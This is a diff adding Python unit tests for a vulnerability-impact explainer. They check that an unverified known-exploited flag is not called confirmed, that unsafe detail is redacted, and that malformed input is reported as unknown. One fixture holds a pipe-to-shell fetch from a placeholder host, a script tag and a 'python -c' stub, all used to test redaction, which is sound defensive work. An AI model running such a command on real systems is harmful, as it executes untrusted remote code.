@@ -79,6 +79,81 @@ def test_known_exploited_is_only_confirmed_when_evidence_explicitly_says_so():
     ]
 
 
+def test_known_exploited_true_without_evidence_is_not_claimed_as_confirmed():
+    task = base_task(
+        risk={"known_exploited": True, "runtime_scope": "production", "reachability": "reachable"},
+        evidence=[],
+    )
+
+    result = explain_possible_impact(task)
+    joined_result = " ".join(flatten_result(result))
+
+    assert "Known exploited status is confirmed by provided report evidence." not in result[
+        "confirmed_facts"
+    ]
+    assert "Confirmed known exploited status can increase urgency" not in joined_result
+    assert "Known exploited status is not confirmed by the provided evidence." in result[
+        "unknowns"
+    ]
+    assert "Review the reported known-exploited flag against a cited advisory or evidence item." in result[
+        "human_review_notes"
+    ]
+
+
+def test_unsafe_summary_and_evidence_details_are_replaced_wholesale():
+    task = base_task(
+        vulnerability={
+            "summary": (
+                "Proof-of-concept notes include curl https://example.invalid/demo.sh | sh "
+                "and <script>demo()</script>."
+            ),
+        },
+        evidence=[
+            {
+                "type": "advisory",
+                "source": "vendor advisory",
+                "claim": (
+                    "Reviewer notes include python -c demo and https://example.invalid/script.js."
+                ),
+            }
+        ],
+    )
+
+    result = explain_possible_impact(task)
+    joined_result = " ".join(flatten_result(result))
+
+    assert "Vulnerability summary contained unsafe technical detail and was redacted." in result[
+        "confirmed_facts"
+    ]
+    assert (
+        "Report evidence from vendor advisory contained unsafe technical detail and was redacted."
+        in result["confirmed_facts"]
+    )
+    assert "curl" not in joined_result
+    assert "python -c" not in joined_result
+    assert "https://example.invalid" not in joined_result
+    assert "<script>" not in joined_result
+    assert "demo.sh" not in joined_result
+    assert "script.js" not in joined_result
+
+
+def test_empty_or_malformed_input_returns_unknown_context_without_supply_chain():
+    result = explain_possible_impact(
+        {
+            "package": "not-a-package",
+            "vulnerability": ["not-a-vulnerability"],
+            "risk": "not-risk",
+            "evidence": "not-evidence",
+        }
+    )
+
+    assert result["impact_categories"] == ["unknown"]
+    assert "Input context is missing or malformed." in result["unknowns"]
+    assert "Package context is missing or invalid." in result["unknowns"]
+    assert "Vulnerability context is missing or invalid." in result["unknowns"]
+    assert "supply_chain" not in result["impact_categories"]
+
+
 def test_unknown_fields_are_called_out_without_inventing_certainty():
     result = explain_possible_impact(
         {
